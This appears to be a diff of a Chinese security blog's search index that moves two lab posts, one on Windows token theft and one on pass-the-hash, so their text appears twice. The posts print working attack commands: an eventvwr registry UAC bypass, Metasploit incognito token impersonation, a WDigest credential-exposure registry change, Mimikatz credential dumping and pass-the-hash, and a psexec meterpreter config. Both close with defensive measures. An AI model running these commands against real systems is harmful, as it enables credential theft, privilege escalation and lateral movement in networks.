+<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
+<ul>
+<li>访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
+<li>密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
+<li>会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
+</ul>
+<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
+<p>目前访问令牌分为两种令牌：</p>
+<ul>
+<li>主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
+<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
+</ul>
+<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
+<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
+<ul>
+<li>用户帐户的安全标识符(SID)</li>
+<li>用户帐户所属的用户群的SIDs</li>
+<li>一个logon SID，标识当前登录会话</li>
+<li>用户或用户群的特权清单</li>
+<li>所有者的SID</li>
+<li>基本群的SID</li>
+<li>当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
+<li>访问令牌资源</li>
+<li>是否为primary或impersonation token</li>
+<li>限制性SIDs的可选列表</li>
+<li>当前impersonation级别</li>
+<li>其他统计</li>
+</ul>
+<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
+<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
+<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
+<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
+<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
+<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
+<blockquote>
+<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
+<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
+</blockquote>
+<p>得到授权令牌：		</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
+
+<p>得到模拟令牌：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
+
+<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
+<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
+<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
+<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
+<ul>
+<li>为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
+<li>及时安装微软推送的补丁</li>
+<li>对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
+<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
+<li>对于令牌，应采取加密存储及多长验证保护</li>
+<li>使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听</li>
+</ul>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqlmap关于os-shell小记</title>
     <url>/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="SqlMap-–os-shell-利用"><a href="#SqlMap-–os-shell-利用" class="headerlink" title="SqlMap –os-shell 利用"></a>SqlMap –os-shell 利用</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol>
@@ -1369,86 +1449,6 @@
       <tags>
         <tag>sqlmap使用</tag>
         <tag>getshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>令牌窃取分析及防范</title>
-    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
-    <content><![CDATA[<blockquote>
-<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
-</blockquote>
-<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
-<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
-<ul>
-<li>访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
-<li>密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
-<li>会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
-</ul>
-<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
-<p>目前访问令牌分为两种令牌：</p>
-<ul>
-<li>主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
-<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
-</ul>
-<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
-<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
-<ul>
-<li>用户帐户的安全标识符(SID)</li>
-<li>用户帐户所属的用户群的SIDs</li>
-<li>一个logon SID，标识当前登录会话</li>
-<li>用户或用户群的特权清单</li>
-<li>所有者的SID</li>
-<li>基本群的SID</li>
-<li>当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
-<li>访问令牌资源</li>
-<li>是否为primary或impersonation token</li>
-<li>限制性SIDs的可选列表</li>
-<li>当前impersonation级别</li>
-<li>其他统计</li>
-</ul>
-<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
-<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
-<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
-<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
-<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
-<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
-<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
-<blockquote>
-<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
-<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
-</blockquote>
-<p>得到授权令牌：		</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
-
-<p>得到模拟令牌：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
-
-<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
-<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
-<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
-<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
-<ul>
-<li>为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
-<li>及时安装微软推送的补丁</li>
-<li>对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
-<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
-<li>对于令牌，应采取加密存储及多长验证保护</li>
-<li>使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听</li>
-</ul>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1646,6 +1646,61 @@
       </tags>
   </entry>
   <entry>
+    <title>哈希传递</title>
+    <url>/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<blockquote>
+<p>  笙歌间错华筵启。喜新春新岁。菜传纤手青丝细。和气入、东风里。</p>
+<p>  幡儿胜儿都姑媂。戴得更忔戏。愿新春以后，吉吉利利，百事都如意。 </p>
+</blockquote>
+<h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p>
+<p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p>
+<p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+
+<p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p>
+<p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p>
+<h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><h3 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h3><p>域搭建可以参考<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windows组策略提权实验</a></p>
+<p>将一台win7添加到域控（win8）中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160244.png" alt="image-20210214145116625"></p>
+<p>登录一下域账户，之后退出域账户，然后切换为本地账户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160250.png" alt="image-20210214145726732"></p>
+<p>切换本地账户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160257.png" alt="image-20210214145957319"></p>
+<h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160302.png" alt="image-20210214152209729"></p>
+<p>获取终端</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:4075bdc2e63781b034a034102356063a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160306.png" alt="image-20210214152128620"></p>
+<p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160310.png" alt="image-20210214152835360"></p>
+<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p>
+<p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 172.16.27.10</span><br><span class="line">set smbuser administrator</span><br><span class="line">set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160316.png" alt="image-20210214154108503"></p>
+<p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p>
+<h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="KB2871997补丁的影响"><a href="#KB2871997补丁的影响" class="headerlink" title="KB2871997补丁的影响"></a>KB2871997补丁的影响</h3><p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。</p>
+<p>但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递。</p>
+<blockquote>
+<p>  KB2871997补丁并不能真正防止哈希传递，只是在一定程度上缓解了PTH的问题。</p>
+<p>  浅探内网横向移动-Pass The Hash  <a href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p>
+<p>  KB22871997是否真的能防御PTH攻击？<a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
+</blockquote>
+<h3 id="防御-mimikatz-攻击"><a href="#防御-mimikatz-攻击" class="headerlink" title="防御 mimikatz 攻击"></a>防御 mimikatz 攻击</h3><p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。<br><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160322.png" alt="image-20210214155950651"></p>
+<p>所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步”privilege::debug”时就会报错了。</p>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>初探Java反序列化漏洞(二)</title>
     <url>/2021/05/02/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/</url>
     <content><![CDATA[<blockquote>
@@ -1706,61 +1761,6 @@
       </categories>
       <tags>
         <tag>漏洞原理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>哈希传递</title>
-    <url>/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<blockquote>
-<p>  笙歌间错华筵启。喜新春新岁。菜传纤手青丝细。和气入、东风里。</p>
-<p>  幡儿胜儿都姑媂。戴得更忔戏。愿新春以后，吉吉利利，百事都如意。 </p>
-</blockquote>
-<h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p>
-<p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p>
-<p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
-
-<p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p>
-<p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p>
-<h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><h3 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h3><p>域搭建可以参考<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windows组策略提权实验</a></p>
-<p>将一台win7添加到域控（win8）中</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160244.png" alt="image-20210214145116625"></p>
-<p>登录一下域账户，之后退出域账户，然后切换为本地账户</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160250.png" alt="image-20210214145726732"></p>
-<p>切换本地账户</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160257.png" alt="image-20210214145957319"></p>
-<h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160302.png" alt="image-20210214152209729"></p>
-<p>获取终端</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:4075bdc2e63781b034a034102356063a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160306.png" alt="image-20210214152128620"></p>
-<p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160310.png" alt="image-20210214152835360"></p>
-<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p>
-<p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 172.16.27.10</span><br><span class="line">set smbuser administrator</span><br><span class="line">set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160316.png" alt="image-20210214154108503"></p>
-<p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p>
-<h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="KB2871997补丁的影响"><a href="#KB2871997补丁的影响" class="headerlink" title="KB2871997补丁的影响"></a>KB2871997补丁的影响</h3><p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。</p>
-<p>但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递。</p>
-<blockquote>
-<p>  KB2871997补丁并不能真正防止哈希传递，只是在一定程度上缓解了PTH的问题。</p>
-<p>  浅探内网横向移动-Pass The Hash  <a href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p>
-<p>  KB22871997是否真的能防御PTH攻击？<a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p>
-</blockquote>
-<h3 id="防御-mimikatz-攻击"><a href="#防御-mimikatz-攻击" class="headerlink" title="防御 mimikatz 攻击"></a>防御 mimikatz 攻击</h3><p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。<br><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210214160322.png" alt="image-20210214155950651"></p>
